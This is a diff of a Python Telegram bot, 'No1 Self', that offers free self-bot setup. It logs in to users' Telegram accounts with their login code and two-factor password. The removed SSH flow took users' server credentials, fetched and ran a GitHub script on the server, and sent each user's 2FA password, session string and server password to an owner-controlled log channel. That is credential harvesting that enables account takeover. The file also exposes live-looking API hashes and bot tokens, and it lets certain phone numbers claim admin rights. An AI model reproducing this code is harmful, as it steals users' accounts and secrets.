@@ -1,10 +1,9 @@
 import os
 import time
-import paramiko
-import ipaddress
 import asyncio
 import logging
 import re
+import httpx # For downloading the self.py script
 from pytz import timezone
 from datetime import timedelta, datetime
 import shutil
@@ -12,11 +11,11 @@ from pyrogram import filters
 from pyrogram.enums import ChatMemberStatus
 from pyrogram.errors import UserNotParticipant
 from telethon import TelegramClient
-from telethon.sessions import SQLiteSession, StringSession # Import StringSession
+from telethon.sessions import SQLiteSession, StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram.filters import Filter
 from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
-from contextlib import contextmanager
+from contextlib import contextmanager # Still kept for future extensibility, though SSH is removed
 from pyrogram import Client, errors, idle
 from pyrogram.types import (
     InlineKeyboardMarkup,
@@ -26,17 +25,19 @@ from pyrogram.types import (
 
 # --- Configuration & Setup ---
 
-# Ensure database directory exists
+# Ensure necessary directories exist
 os.makedirs("database", exist_ok=True)
-os.makedirs("sessions", exist_ok=True) # Ensure sessions directory exists
+os.makedirs("sessions", exist_ok=True) # For temporary Telethon login sessions
+os.makedirs("self_bot_template", exist_ok=True) # For the downloaded self.py template
+os.makedirs("selfbot_instances", exist_ok=True) # For individual user self-bot instances
 
 # File paths for persistent data
 DB_TEXT_PATH = "database/database.txt"
 BANNED_FILE = "database/banned_users.txt"
 BANNED_NUMBERS_FILE = "database/banned_numbers.txt"
-MAX_RUNS_FILE = "database/max_runs.txt"
+MAX_RUNS_FILE = "database/max_runs.txt" # Stores current available runs
 LAST_RUNS_FILE = "database/last_runs.txt"
-ADMIN_LOG_CHANNEL_FILE = "database/admin_log_channel.txt" # Renamed from channel_id.txt for clarity
+ADMIN_LOG_CHANNEL_FILE = "database/admin_log_channel.txt"
 
 # Logging setup
 logging.basicConfig(
@@ -48,20 +49,26 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Telegram API credentials (CONSIDER USING ENVIRONMENT VARIABLES FOR PRODUCTION)
-API_ID = 21991530
-API_HASH = "6fedb4494836743356f1624c1e6377ae"
-BOT_TOKEN = "8165013560:AAF37zrTnomh9DRnhpYqZj7YbPhUh0L_TYI"
+API_ID = 29042268
+API_HASH = "54a7b377dd4a04a58108639febe2f443"
+BOT_TOKEN = "7481383802:AAGGhXD0ehi8EHrm_NsAUVJsbjdu8RwaIHU"
 
-# Owner IDs and special access numbers (REVIEW SECURITY IMPLICATIONS OF ADNUMBER)
-OWNER_IDS = [7072806412, 7376216373, 7994315858, 6913657704]
-ADNUMBER = ["989961936507", "989302920173", "989965573797"] # Special numbers for admin access - SECURITY RISK!
+# Owner IDs and special access numbers (CRITICAL SECURITY RISK: ADNUMBER GRANTS ADMIN ACCESS)
+# It is highly recommended to remove ADNUMBER and manage admin access purely by OWNER_IDS.
+# A phone number can be reassigned or spoofed.
+OWNER_IDS = [6508600903]
+ADNUMBER = ["989362349331"] # Special numbers for admin access - SECURITY RISK!
 
 # Channel and Group Usernames (NOT IDs, as specified for joining checks)
-STATUS_CHANNEL_USERNAME = "No1Self" # Public channel for status updates and educational content
-GROUP_USERNAME = "No1SelfGp" # Public group for users
+STATUS_CHANNEL_USERNAME = "no1self" # Public channel for status updates and educational content
+GROUP_USERNAME = "no1selfgp" # Public group for users
+
+# Self-bot script source
+SELF_BOT_SCRIPT_URL = "https://raw.githubusercontent.com/Par123456/selfsaz/refs/heads/main/self.py"
+LOCAL_SELF_BOT_TEMPLATE_PATH = os.path.join("self_bot_template", "self.py")
 
 # Bot operational settings
-MAX_CONCURRENT_TASKS = 5 # Maximum number of simultaneous SSH deployments
+MAX_CONCURRENT_SELF_BOTS = 5 # Maximum number of simultaneous self-bot instances running
 CONVERSATION_TIMEOUT_SECONDS = 300 # 5 minutes for the entire setup conversation
 BOT_ACTIVE = True # Global toggle for bot activity
 
@@ -72,10 +79,10 @@ BANNED_USERS = set() # Set of banned user IDs
 BANNED_NUMBERS = set() # Set of banned phone numbers
 ADMIN_LOG_CHANNEL_ID = None # Dynamically loaded/set admin log channel ID
 
-# Concurrency control for SSH operations
-semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
+# Concurrency control for local self-bot operations
+semaphore = asyncio.Semaphore(MAX_CONCURRENT_SELF_BOTS)
 
-# Conversation state for active users {user_id: {"step": "...", "data": {...}}}
+# Conversation state for active users {user_id: {"step": "...", "data": {...}, "client": TelethonClient, "self_bot_process": asyncio.Process}}
 CONV = {}
 
 # Manager for tracking conversation completion and enabling timeouts
@@ -129,24 +136,24 @@ def save_last_runs():
             f.write(f"{uid},{ts}\n")
     logger.info("Saved last run entries.")
 
-def load_max_runs():
-    """Loads max runs count from file."""
-    if os.path.exists(MAX_RUNS_FILE):
+def load_remaining_runs(): # Renamed for clarity, it loads the current available runs
+    """Loads remaining runs count from file."""
+    if os.path.exists(MAX_RUNS_FILE): # Using MAX_RUNS_FILE for current remaining count
         with open(MAX_RUNS_FILE, "r", encoding="utf-8") as f:
             try:
                 count = int(f.read().strip())
-                logger.info(f"Loaded max runs: {count}")
+                logger.info(f"Loaded remaining runs: {count}")
                 return count
             except ValueError:
                 logger.error(f"Invalid integer in {MAX_RUNS_FILE}. Resetting to 0.")
                 return 0
     return 0
 
-def save_max_runs(count):
-    """Saves max runs count to file."""
+def save_remaining_runs(count): # Renamed for clarity
+    """Saves remaining runs count to file."""
     with open(MAX_RUNS_FILE, "w", encoding="utf-8") as f:
         f.write(str(count))
-    logger.info(f"Saved max runs: {count}")
+    logger.info(f"Saved remaining runs: {count}")
 
 def load_banned_users():
     """Loads banned user IDs from file."""
@@ -201,7 +208,7 @@ def save_admin_log_channel_id(channel_id):
 
 # Initial loading of persistent data
 load_last_runs()
-REMAINING_RUNS = load_max_runs()
+REMAINING_RUNS = load_remaining_runs() # Renamed function
 load_banned_users()
 load_banned_numbers()
 ADMIN_LOG_CHANNEL_ID = load_admin_log_channel_id()
@@ -215,72 +222,69 @@ class OwnerFilter(Filter):
 
 is_owner = OwnerFilter()
 
-@contextmanager
-def ssh_connection(ip, username, password):
-    """Context manager for Paramiko SSH connection."""
-    ssh = paramiko.SSHClient()
+async def download_self_bot_script():
+    """Downloads the self.py script from GitHub and saves it locally."""
+    os.makedirs("self_bot_template", exist_ok=True)
     try:
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, username=username, password=password, timeout=20, allow_agent=False, look_for_keys=False)
-        logger.info(f"SSH connection established to {ip} for user {username}")
-        yield ssh
+        async with httpx.AsyncClient() as client:
+            response = await client.get(SELF_BOT_SCRIPT_URL, timeout=30)
+            response.raise_for_status() # Raise an exception for bad status codes
+            with open(LOCAL_SELF_BOT_TEMPLATE_PATH, "wb") as f:
+                f.write(response.content)
+        logger.info(f"Self-bot script downloaded successfully to {LOCAL_SELF_BOT_TEMPLATE_PATH}")
+    except httpx.HTTPStatusError as e:
+        logger.error(f"Failed to download self-bot script: HTTP error {e.response.status_code} for {SELF_BOT_SCRIPT_URL}")
+    except httpx.RequestError as e:
+        logger.error(f"Failed to download self-bot script due to network error: {e}")
     except Exception as e:
-        logger.error(f"Failed to establish SSH connection to {ip} for user {username}: {e}")
-        raise
-    finally:
-        ssh.close()
-        logger.info(f"SSH connection closed for {ip}")
+        logger.error(f"An unexpected error occurred while downloading self-bot script: {e}")
 
 def save_user_text(user_id: int, username: str = None, phone: str = None):
     """
     Saves or updates user information (ID, username, phone) in a text database.
-    Ensures unique user IDs and updates existing entries.
+    Ensures unique user IDs and updates existing entries, maintaining order.
     """
     username_str = f"@{username}" if username and not username.startswith("@") else (username or '')
     phone_str = phone or ''
 
-    lines = []
-    updated = False
-
+    # Read all existing data
+    user_data = [] # List of (user_id, username, phone) tuples
     if os.path.exists(DB_TEXT_PATH):
         with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
-            lines = f.readlines()
+            for line in f:
+                # Regex: 1. USER_ID @USERNAME PHONE_NUMBER (flexible with @ for username, and optional phone)
+                match = re.match(r"^\d+\.\s+(\d+)\s+(@?\S*)\s*(\S*)$", line.strip())
+                if match:
+                    user_data.append((int(match.group(1)), match.group(2), match.group(3)))
+                else:
+                    logger.warning(f"Malformed line in {DB_TEXT_PATH}: '{line.strip()}' - Skipping.")
 
-    for i, line in enumerate(lines):
-        # Using regex to robustly parse the line, assuming format "1. USER_ID @USERNAME PHONE_NUMBER"
-        match = re.match(r"^\d+\.\s+(\d+)\s+(@?\S*)\s*(\S*)$", line.strip())
-        if match:
-            existing_user_id = int(match.group(1))
-            existing_username = match.group(2)
-            existing_phone = match.group(3)
-
-            if existing_user_id == user_id:
-                final_username = username_str if username_str else existing_username
-                final_phone = phone_str if phone_str else existing_phone
-                new_data = f"{existing_user_id} {final_username} {final_phone}".strip()
-                lines[i] = f"{i+1}. {new_data}\n" # Re-numbering based on current position
-                updated = True
-                break
-        else:
-            logger.warning(f"Malformed line in {DB_TEXT_PATH}: {line.strip()}")
+    # Update or add new user
+    updated = False
+    for i, (existing_uid, existing_uname, existing_phone) in enumerate(user_data):
+        if existing_uid == user_id:
+            final_username = username_str if username_str else existing_uname
+            final_phone = phone_str if phone_str else existing_phone
+            user_data[i] = (user_id, final_username, final_phone)
+            updated = True
+            logger.info(f"Updated user {user_id} in database.")
+            break
 
     if not updated:
-        index = len(lines) + 1
-        new_data = f"{user_id} {username_str} {phone_str}".strip()
-        lines.append(f"{index}. {new_data}\n")
+        user_data.append((user_id, username_str, phone_str))
         logger.info(f"Added new user {user_id} to database.")
-    else:
-        logger.info(f"Updated user {user_id} in database.")
 
-
+    # Rewrite the entire file
     with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
-        f.writelines(lines)
+        for idx, (uid, uname, uphone) in enumerate(user_data):
+            f.write(f"{idx+1}. {uid} {uname} {uphone}\n".strip() + "\n")
 
 
 async def cleanup_user_state(user_id: int):
     """
     Cleans up resources associated with a user's active conversation,
-    including disconnecting Telethon client and deleting session files.
+    including disconnecting Telethon client, deleting session files,
+    terminating self-bot process, and removing user's self-bot instance directory.
     """
     logger.info(f"Initiating cleanup for user {user_id}.")
     
@@ -296,10 +300,28 @@ async def cleanup_user_state(user_id: int):
         finally:
             CONV[user_id].pop("client", None) # Remove client reference from CONV
 
-    # Schedule delayed deletion of user-specific session files
-    async def delayed_session_delete():
-        await asyncio.sleep(5) # Give a few seconds for potential file handles to release
+    # Terminate self-bot process if it exists
+    self_bot_process = CONV.get(user_id, {}).get("self_bot_process")
+    if self_bot_process:
         try:
+            if self_bot_process.returncode is None: # Process is still running
+                logger.info(f"Terminating self-bot process {self_bot_process.pid} for user {user_id}.")
+                self_bot_process.terminate()
+                await asyncio.wait_for(self_bot_process.wait(), timeout=5) # Wait for process to exit
+            logger.info(f"Self-bot process for user {user_id} terminated or already stopped.")
+        except asyncio.TimeoutError:
+            logger.warning(f"Self-bot process {self_bot_process.pid} for user {user_id} did not terminate gracefully. Killing.")
+            self_bot_process.kill()
+        except Exception as e:
+            logger.error(f"Error terminating self-bot process for user {user_id}: {e}")
+        finally:
+            CONV[user_id].pop("self_bot_process", None) # Remove process reference
+
+    # Schedule delayed deletion of user-specific session files and self-bot instance directory
+    async def delayed_file_delete():
+        await asyncio.sleep(2) # Give a few seconds for potential file handles to release
+        try:
+            # Delete temporary Telethon session files (from login phase)
             session_prefix = os.path.join("sessions", f"user_{user_id}")
             local_session = f"{session_prefix}.session"
             local_journal = f"{session_prefix}.session-journal" # Telethon might create a journal file
@@ -311,13 +333,20 @@ async def cleanup_user_state(user_id: int):
                     deleted_files.append(f)
             
             if deleted_files:
-                logger.info(f"Deleted session files for user {user_id}: {', '.join(deleted_files)}")
+                logger.info(f"Deleted temp session files for user {user_id}: {', '.join(deleted_files)}")
+            
+            # Delete user's self-bot instance directory
+            user_self_bot_dir = os.path.join("selfbot_instances", str(user_id))
+            if os.path.exists(user_self_bot_dir):
+                shutil.rmtree(user_self_bot_dir)
+                logger.info(f"Deleted self-bot instance directory '{user_self_bot_dir}' for user {user_id}.")
             else:
-                logger.info(f"No session files found for deletion for user {user_id}.")
-        except Exception as err:
-            logger.error(f"Error deleting session files for user {user_id}: {err}")
+                logger.debug(f"Self-bot instance directory '{user_self_bot_dir}' not found for user {user_id}, no deletion needed.")
 
-    asyncio.create_task(delayed_session_delete())
+        except Exception as err:
+            logger.error(f"Error deleting files/directory for user {user_id}: {err}", exc_info=True)
+
+    asyncio.create_task(delayed_file_delete())
 
     # Clear conversation state
     CONV.pop(user_id, None)
@@ -329,7 +358,11 @@ async def cleanup_user_state(user_id: int):
         logger.info(f"Active conversation task reference cleared for user {user_id}.")
 
 async def update_channel_message(retries=3):
-    """Updates the status message in the public channel."""
+    """
+    Updates the status message in the public channel.
+    Note: message_id=94 is hardcoded. It's best practice to store this persistently
+    and allow admins to configure it (e.g., via a command to forward a message to set it).
+    """
     for attempt in range(retries):
         try:
             now = datetime.now(timezone("Asia/Tehran"))
@@ -338,15 +371,13 @@ async def update_channel_message(retries=3):
             message_text = (
                 f"ساعت: {current_time}\n"
                 f"تعداد ران مجاز: {REMAINING_RUNS} نفر\n"
-                "ربات No1 Self آماده خدمت رسانی است :)\n" # Simplified status, removed confusing global cooldown
+                "ربات No1 Self آماده خدمت رسانی است :)\n"
                 f"@{bot.me.username}" # Dynamic bot username
             )
 
-            # This message_id=94 should ideally be stored persistently and configurable.
-            # For now, it's hardcoded as per original.
             await bot.edit_message_text(
                 chat_id=STATUS_CHANNEL_USERNAME,
-                message_id=94,
+                message_id=94, # CRITICAL: Hardcoded message ID - consider making configurable
                 text=message_text
             )
             logger.info("Status channel message updated successfully.")
@@ -392,8 +423,8 @@ async def conversation_timeout_manager(user_id: int, chat_id: int, client: Clien
 # --- Telegram Message Handlers ---
 
 @bot.on_message(filters.command("run") & filters.private & is_owner)
-async def set_max_runs(client: Client, message: Message):
-    """Admin command to set the global maximum number of allowed runs."""
+async def set_remaining_runs_command(client: Client, message: Message): # Renamed for clarity
+    """Admin command to set the global number of allowed runs."""
     try:
         args = message.text.split()
         if len(args) != 2:
@@ -404,14 +435,14 @@ async def set_max_runs(client: Client, message: Message):
             return await message.reply_text("استفاده نادرست از دستور! تعداد ران نمی‌تواند منفی باشد.")
 
         globals()["REMAINING_RUNS"] = count
-        save_max_runs(count)
+        save_remaining_runs(count) # Renamed function
         await update_channel_message()
         await message.reply_text(f"تعداد ران مجاز به {count} تنظیم شد.")
         logger.info(f"Owner {message.from_user.id} set REMAINING_RUNS to {count}.")
     except ValueError:
         await message.reply_text("استفاده نادرست از دستور! لطفاً یک عدد وارد کنید.")
     except Exception as e:
-        logger.error(f"Error in set_max_runs for user {message.from_user.id}: {e}", exc_info=True)
+        logger.error(f"Error in set_remaining_runs_command for user {message.from_user.id}: {e}", exc_info=True)
         await message.reply_text("خطایی رخ داد! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("runs") & filters.private & is_owner)
@@ -600,7 +631,8 @@ async def toggle_bot(client: Client, message: Message):
 async def save_admin_log_channel(client: Client, message: Message):
     """Admin command to set the channel for logging new runs."""
     try:
-        if not message.forward_from_chat and not message.chat.type == "channel":
+        # Check if the message is from a channel, or a forwarded message from a channel
+        if not message.forward_from_chat and not (message.chat and message.chat.type == "channel"):
             return await message.reply_text("لطفاً این دستور را در کانال مورد نظر ارسال کنید یا پیام از کانال را به اینجا فوروارد کنید.")
 
         chat_id = message.chat.id
@@ -608,9 +640,11 @@ async def save_admin_log_channel(client: Client, message: Message):
 
         # Check if the bot can send messages to this channel
         try:
-            await client.send_message(chat_id, "این کانال به عنوان کانال لاگ No1 Self تنظیم شد.")
+            # Send a test message
+            test_msg = await client.send_message(chat_id, "این کانال به عنوان کانال لاگ No1 Self تنظیم شد.")
+            await test_msg.delete() # Delete the test message for cleanliness
         except Exception as e:
-            return await message.reply_text(f"ربات نمی‌تواند به این کانال پیام ارسال کند. لطفاً ربات را به عنوان ادمین در کانال اضافه کنید. Error: {e}")
+            return await message.reply_text(f"ربات نمی‌تواند به این کانال پیام ارسال کند. لطفاً ربات را به عنوان ادمین در کانال اضافه کنید و دسترسی ارسال پیام را به آن بدهید. Error: {e}")
 
         global ADMIN_LOG_CHANNEL_ID
         ADMIN_LOG_CHANNEL_ID = chat_id
@@ -740,7 +774,7 @@ async def run_self(client: Client, cb):
         logger.warning(f"User {user_id} attempted to start a new run while another is active.")
         return await cb.answer("شما در حال حاضر یک فرآیند اجرای سلف را آغاز کرده‌اید. لطفاً صبر کنید تا آن به پایان برسد یا زمان آن منقضی شود.", show_alert=True)
 
-    # Acquire semaphore to limit concurrent SSH operations
+    # Acquire semaphore to limit concurrent local self-bot instances
     async with semaphore:
         try:
             # Check channel and group membership again
@@ -816,7 +850,7 @@ async def run_self(client: Client, cb):
     except Exception as e:
         logger.error(f"Unhandled error in run_self for user {user_id}: {e}", exc_info=True)
         await cb.answer("خطایی رخ داده است! لطفاً دوباره امتحان کنید.", show_alert=True)
-        await cleanup_user_state(user_id) # Ensure cleanup in case of early errors
+        await cleanup_user_state(user_id)
 
 
 @bot.on_callback_query(filters.regex("check_number"))
@@ -884,11 +918,11 @@ async def edu_run(client: Client, cb):
     """Forwards the 'run' education message from the status channel."""
     try:
         await cb.message.delete()
-        # Message ID 311 should correspond to a message in @No1Self
+        # CRITICAL: Hardcoded message ID 311 - consider making configurable
         await client.copy_message(
             chat_id=cb.message.chat.id,
             from_chat_id=STATUS_CHANNEL_USERNAME,
-            message_id=311 # Hardcoded message ID - consider making configurable
+            message_id=311
         )
         await cb.answer()
     except Exception as e:
@@ -900,11 +934,11 @@ async def edu_server(client: Client, cb):
     """Forwards the 'server' education message from the status channel."""
     try:
         await cb.message.delete()
-        # Message ID 310 should correspond to a message in @No1Self
+        # CRITICAL: Hardcoded message ID 310 - consider making configurable
         await client.copy_message(
             chat_id=cb.message.chat.id,
             from_chat_id=STATUS_CHANNEL_USERNAME,
-            message_id=310 # Hardcoded message ID - consider making configurable
+            message_id=310
         )
         await cb.answer()
     except Exception as e:
@@ -938,7 +972,7 @@ async def conversation_handler(client: Client, message: Message):
             if "last_bot_msg" in CONV[user_id]:
                 await client.delete_messages(chat_id=chat_id, message_ids=CONV[user_id]["last_bot_msg"])
         except Exception as e:
-            logger.warning(f"Could not delete message for user {user_id}: {e}")
+            logger.warning(f"Could not delete message(s) for user {user_id}: {e}")
 
         if current_step == "check_number":
             if not message.contact or not message.contact.phone_number:
@@ -956,12 +990,10 @@ async def conversation_handler(client: Client, message: Message):
                 logger.info(f"Phone number {number} for user {user_id} is banned.")
             elif number in ADNUMBER:
                 status_message = "شما ادمین هستید!"
-                if user_id not in OWNER_IDS:
-                    OWNER_IDS.append(user_id) # Grant temporary admin status (not persistent across restarts)
+                if user_id not in OWNER_IDS: # Add to in-memory OWNER_IDS for current session
+                    OWNER_IDS.append(user_id)
                     status_message += " و به عنوان ادمین موقت اضافه شدید!"
                     logger.info(f"User {user_id} (phone {number}) granted temporary admin status.")
-                else:
-                    status_message = "شما ادمین هستید!"
             else:
                 status_message = "شما مجاز به استفاده از سلف ساز هستید!"
                 logger.info(f"Phone number {number} for user {user_id} is free to use.")
@@ -988,6 +1020,9 @@ async def conversation_handler(client: Client, message: Message):
                 CONV[user_id]["last_bot_msg"] = bot_msg.id
                 return
 
+            # Note: The original logic for "93" or "972" country codes seemed to block Iranian numbers (starting with 9893, 98972).
+            # This is kept as per original requirement, but might be unintended.
+            # Assuming "93" refers to Afghanistan, "972" to Israel.
             if user_id not in OWNER_IDS and (number.startswith("93") or number.startswith("972")):
                 logger.warning(f"User {user_id} tried to register with unsupported country code: {number}")
                 await message.reply_text(
@@ -1073,11 +1108,8 @@ async def conversation_handler(client: Client, message: Message):
                     code=code
                 )
                 logger.info(f"User {user_id} successfully signed in with code.")
-                bot_msg = await message.reply_text("""ورود موفق! آیپی سرور را ارسال کنید:
-
-سایت دریافت سرور:
-cp.sprinthost.ru""")
-                CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
+                # Proceed to local self-bot deployment
+                await handle_local_self_bot_deployment(client, message, user_id, chat_id, tele_client)
             except SessionPasswordNeededError:
                 logger.info(f"User {user_id} requires 2FA password.")
                 twofa_msg = await message.reply_text("رمز دو مرحله‌ای را وارد کنید:")
@@ -1102,11 +1134,8 @@ cp.sprinthost.ru""")
                 await tele_client.sign_in(password=password)
                 CONV[user_id]["two_step"] = password # Store 2FA password (sensitive)
                 logger.info(f"User {user_id} successfully signed in with 2FA password.")
-                bot_msg = await message.reply_text("""ورود موفق! آیپی سرور را ارسال کنید:
-
-سایت دریافت سرور:
-cp.sprinthost.ru""")
-                CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
+                # Proceed to local self-bot deployment
+                await handle_local_self_bot_deployment(client, message, user_id, chat_id, tele_client)
             except Exception as e:
                 logger.error(f"Error during sign-in with 2FA password for user {user_id}: {e}", exc_info=True)
                 await message.reply_text(
@@ -1116,214 +1145,8 @@ cp.sprinthost.ru""")
                 CONV_COMPLETED_EVENT.set_completed(user_id)
                 return
 
-        elif current_step == "get_ip":
-            ip = message.text.strip()
-            try:
-                ipaddress.ip_address(ip) # Validate IP address format
-                CONV[user_id]["ip"] = ip
-                logger.info(f"User {user_id} submitted valid IP: {ip}.")
-                bot_msg = await message.reply_text("""یوزرنیم سرور را ارسال کنید:
-
-سایت دریافت سرور:
-cp.sprinthost.ru""")
-                CONV[user_id].update({"step": "get_user", "last_bot_msg": bot_msg.id})
-            except ValueError:
-                logger.warning(f"User {user_id} submitted invalid IP: {ip}.")
-                bot_msg = await message.reply_text(
-                    """آی‌پی وارد شده معتبر نیست!
-                    
-سایت دریافت سرور:
-cp.sprinthost.ru"""
-                )
-                CONV[user_id]["last_bot_msg"] = bot_msg.id
-                return
-
-        elif current_step == "get_user":
-            server_user = message.text.strip()
-            if not server_user:
-                bot_msg = await message.reply_text("یوزرنیم سرور نمی‌تواند خالی باشد. لطفاً یوزرنیم را وارد کنید.")
-                CONV[user_id]["last_bot_msg"] = bot_msg.id
-                return
-            CONV[user_id]["user"] = server_user
-            logger.info(f"User {user_id} submitted server username: {server_user}.")
-            bot_msg = await message.reply_text("""پسورد سرور را ارسال کنید:
-
-سایت دریافت سرور:
-cp.sprinthost.ru""")
-            CONV[user_id].update({"step": "get_pass", "last_bot_msg": bot_msg.id})
-
-        elif current_step == "get_pass":
-            passwd = message.text.strip()
-            if not passwd:
-                bot_msg = await message.reply_text("پسورد سرور نمی‌تواند خالی باشد. لطفاً پسورد را وارد کنید.")
-                CONV[user_id]["last_bot_msg"] = bot_msg.id
-                return
-            CONV[user_id]["passwd"] = passwd
-            logger.info(f"User {user_id} submitted server password (masked).")
-
-            # Final step: Execute SSH commands and deploy
-            ip = CONV[user_id]["ip"]
-            server_user = CONV[user_id]["user"]
-            tele_client = CONV[user_id]["client"]
-            session_path_prefix = CONV[user_id]["session_path_prefix"]
-            
-            wait_msg = await message.reply_text("""در حال اجرای عملیات ران، لطفاً صبر کنید!
-این فرآیند ممکن است چند دقیقه طول بکشد.""")
-            logger.info(f"User {user_id} started SSH deployment to {ip} with user {server_user}.")
-
-            try:
-                with ssh_connection(ip, server_user, passwd) as ssh:
-                    sftp = ssh.open_sftp()
-                    sftp.get_channel().settimeout(30)
-
-                    # Check if 'self' directory already exists
-                    try:
-                        sftp.stat("self")
-                        await wait_msg.edit_text(
-                            """سرور قبلاً استفاده شده است! لطفاً از سرور جدید استفاده کنید.
-
-cp.sprinthost.ru"""
-                        )
-                        logger.warning(f"User {user_id}'s server {ip} already has 'self' directory.")
-                        CONV_COMPLETED_EVENT.set_completed(user_id)
-                        await cleanup_user_state(user_id)
-                        return
-                    except FileNotFoundError:
-                        pass # Directory does not exist, proceed
-
-                    # Create 'self' directory on remote server
-                    try:
-                        stdin, stdout, stderr = ssh.exec_command("mkdir -p self", timeout=30)
-                        exit_code = stdout.channel.recv_exit_status()
-                        if exit_code != 0:
-                            error = stderr.read().decode().strip()
-                            raise Exception(f"خطا در ایجاد دایرکتوری 'self' در سرور ریموت: {error}")
-                        logger.info(f"Created 'self' directory on {ip}.")
-                    except Exception as e:
-                        logger.error(f"SSH command 'mkdir -p self' failed for user {user_id} on {ip}: {e}", exc_info=True)
-                        await wait_msg.edit_text(
-                            "خطا در ایجاد پوشه 'self' روی سرور! لطفاً از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید."
-                        )
-                        CONV_COMPLETED_EVENT.set_completed(user_id)
-                        await cleanup_user_state(user_id)
-                        return
-
-                    # Download self.py script directly to remote server
-                    remote_script_dir = "self"
-                    remote_script_name = "self.py"
-                    remote_script_path = os.path.join(remote_script_dir, remote_script_name)
-                    script_url = "https://raw.githubusercontent.com/Par123456/selfsaz/refs/heads/main/self.py"
-
-                    download_command = f"wget -O {remote_script_path} {script_url}"
-                    logger.info(f"Executing remote download: {download_command} on {ip}.")
-                    stdin, stdout, stderr = ssh.exec_command(download_command, timeout=60)
-                    exit_code = stdout.channel.recv_exit_status()
-                    if exit_code != 0:
-                        error = stderr.read().decode().strip()
-                        raise Exception(f"خطا در دانلود فایل سلف از سرور ریموت: {error}")
-                    logger.info(f"Downloaded self.py to {remote_script_path} on {ip}.")
-
-
-                    # Generate and upload StringSession
-                    # The Telethon client is already connected from get_number/get_code/get_2fa steps
-                    string_session = StringSession.save(tele_client.session)
-                    CONV[user_id]["string"] = string_session # Store for admin log
-                    logger.info(f"Generated StringSession for user {user_id}.")
-
-                    # Now upload the generated .session file
-                    local_session_file = f"{session_path_prefix}.session"
-                    remote_session_file = f"{remote_script_dir}/session.session" # Renamed to generic name on remote
-
-                    if os.path.exists(local_session_file):
-                        await asyncio.to_thread(sftp.put, local_session_file, remote_session_file)
-                        ssh.exec_command("sync", timeout=5) # Ensure file is flushed
-                        logger.info(f"Uploaded {local_session_file} to {remote_session_file} on {ip}.")
-                    else:
-                        logger.error(f"Local session file {local_session_file} not found for user {user_id}.")
-                        raise Exception("خطا در یافتن فایل سشن تلگرام.")
-                    
-                    # Install dependencies and run the selfbot
-                    commands = [
-                        f"cd {remote_script_dir} && pip install telethon pytz jdatetime paramiko",
-                        f"cd {remote_script_dir} && nohup python3 {remote_script_name} >> log.txt 2>&1 &"
-                    ]
-
-                    for cmd in commands:
-                        logger.info(f"Executing remote command: {cmd} on {ip}.")
-                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=120) # Increased timeout for pip install
-                        exit_status = stdout.channel.recv_exit_status()
-                        if exit_status != 0:
-                            error_msg = stderr.read().decode().strip()
-                            raise Exception(f"خطا در اجرای سلف! {error_msg}. ممکن است دسترسی به دستورات ترمینال سرور شما داده نشده باشد.")
-                        await asyncio.sleep(1) # Small delay between commands
-                    logger.info(f"Selfbot deployment commands executed on {ip}.")
-
-                # Post-deployment actions
-                await cleanup_user_state(user_id) # Cleans up local session files and client
-                await wait_msg.delete() # Delete the "in progress" message
-
-                if user_id not in OWNER_IDS and REMAINING_RUNS > 0:
-                    globals()["REMAINING_RUNS"] -= 1
-                    save_max_runs(REMAINING_RUNS)
-                    logger.info(f"REMAINING_RUNS decremented to {REMAINING_RUNS} for user {user_id}.")
-
-                if user_id not in OWNER_IDS:
-                    LAST_RUNS[user_id] = time.time() # Update 24-hour cooldown
-                    save_last_runs()
-                    logger.info(f"User {user_id} added to 24-hour cooldown.")
-
-                await message.reply_text(
-                    """سلف با موفقیت روی سرور شما اجرا شد، با دستور `راهنما` منوی راهنمای سلف را باز کنید.
-
-فروش این سلف ممنوع است!
-@No1Self
-سلف ساز رایگان:
-@No1SelfBot"""
-                )
-                logger.info(f"Selfbot successfully deployed for user {user_id}.")
-
-                # Send log to admin channel
-                if ADMIN_LOG_CHANNEL_ID:
-                    username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
-                    two_step_pass = CONV[user_id].get("two_step", "NoPasswd!") # Sensitive data
-
-                    info = (
-                        f"**New No1 Self Run!**\n"
-                        f"**User:** {username_or_mention}\n"
-                        f"**User ID:** `{user_id}`\n"
-                        f"**Number:** `+{CONV[user_id]['number']}`\n"
-                        f"**2FA Password:** `{two_step_pass}`\n" # Highly sensitive, review logging policy
-                        f"**StringSession:** `{CONV[user_id]['string']}`\n" # Highly sensitive
-                        f"**Server IP:** `{ip}`\n"
-                        f"**Server User:** `{server_user}`\n"
-                        f"**Server Password:** `{passwd}`\n" # Highly sensitive, review logging policy
-                        f"**Remaining Global Runs:** `{REMAINING_RUNS}`"
-                    )
-
-                    try:
-                        await bot.send_message(ADMIN_LOG_CHANNEL_ID, info, disable_web_page_preview=True)
-                        logger.info(f"Admin log sent for user {user_id}.")
-                    except Exception as e:
-                        logger.error(f"Error sending admin log message for user {user_id}: {e}", exc_info=True)
-                else:
-                    logger.warning(f"ADMIN_LOG_CHANNEL_ID not set. Could not send deployment log for user {user_id}.")
-
-                CONV_COMPLETED_EVENT.set_completed(user_id) # Signal successful completion to timeout manager
-                
-            except Exception as e:
-                logger.error(f"SSH deployment or related error for user {user_id} on {ip}: {e}", exc_info=True)
-                if wait_msg:
-                    try:
-                        await wait_msg.edit_text(
-                            "خطا در اجرای سلف! لطفاً از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید. برای شروع دوباره /start را ارسال کنید."
-                        )
-                    except Exception as edit_error:
-                        logger.error(f"Error editing error message for user {user_id}: {edit_error}")
-                        await message.reply_text(
-                            "خطا در اجرای سلف! لطفاً از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید. برای شروع دوباره /start را ارسال کنید."
-                        )
-                await cleanup_user_state(user_id)
